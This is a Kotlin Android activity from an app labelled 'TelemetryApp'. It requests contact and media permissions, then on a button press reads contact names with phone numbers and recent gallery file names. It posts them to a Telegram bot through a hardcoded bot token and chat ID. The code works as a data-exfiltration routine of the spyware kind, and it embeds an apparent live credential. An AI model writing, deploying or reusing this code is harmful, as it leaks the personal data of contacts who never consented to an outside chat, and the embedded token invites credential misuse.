package com.example.telemetry

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.telemetry.repository.ContactRepository
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    private val BOT_TOKEN = "9259742685:AAGMARnF3JH4BQMaj81SwnJkjUkOP8aGko"
    private val CHAT_ID = "8626384298"
    private val PERMISSION_REQUEST_CODE = 100

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        checkAndRequestPermissions()

        val btnSend = findViewById<Button>(R.id.btnSendContacts)
        btnSend.setOnClickListener {
            Toast.javaClass
            Toast.makeText(this, "Collecting data...", Toast.LENGTH_SHORT).show()
            collectAndSendTelemetry()
        }
    }

    private fun checkAndRequestPermissions() {
        val permissionsList = mutableListOf(Manifest.permission.READ_CONTACTS)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsList.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissionsList.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        val listPermissionsNeeded = permissionsList.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (listPermissionsNeeded.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toTypedArray(), PERMISSION_REQUEST_CODE)
        }
    }

    private fun collectAndSendTelemetry() {
        val contactRepository = ContactRepository(this)
        val contacts = contactRepository.getAllContacts()

        val galleryList = mutableListOf<String>()
        val projection = arrayOf(
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED
        )
        val cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            MediaStore.Images.Media.DATE_ADDED + " DESC"
        )

        cursor?.use {
            val nameIndex = it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
            while (it.moveToNext() && galleryList.size < 20) {
                val imageName = if (nameIndex != -1) it.getString(nameIndex) ?: "Unknown" else "Unknown"
                galleryList.add(imageName)
            }
        }

        val messageBuilder = StringBuilder("📱 *TelemetryApp - Full Report*\n\n")
        messageBuilder.append("👥 Total Contacts: *${contacts.size}*\n")
        for (i in 0 until minOf(contacts.size, 15)) {
            messageBuilder.append("• ${contacts[i].name} (${contacts[i].phoneNumber})\n")
        }

        messageBuilder.append("\n🖼️ Recent Gallery Images: *${galleryList.size}*\n")
        for (img in galleryList) {
            messageBuilder.append("• $img\n")
        }

        val messageText = messageBuilder.toString()

        Thread {
            try {
                val urlString = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                val jsonParam = JSONObject()
                jsonParam.put("chat_id", CHAT_ID)
                jsonParam.put("text", messageText)
                jsonParam.put("parse_mode", "Markdown")

                val os = OutputStreamWriter(conn.outputStream)
                os.write(jsonParam.toString())
                os.flush()
                os.close()

                val responseCode = conn.responseCode
                Log.d("TelegramResponse", "Response Code: $responseCode")

                runOnUiThread {
                    Toast.makeText(this, "Data sent to Telegram successfully!", Toast.LENGTH_SHORT).show()
                }

            } catch (e: Exception) {
                e.printStackTrace()
                Log.e("TelegramError", "Error sending message: ${e.message}")
                runOnUiThread {
                    Toast.makeText(this, "Failed: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }
        }.start()
    }
}
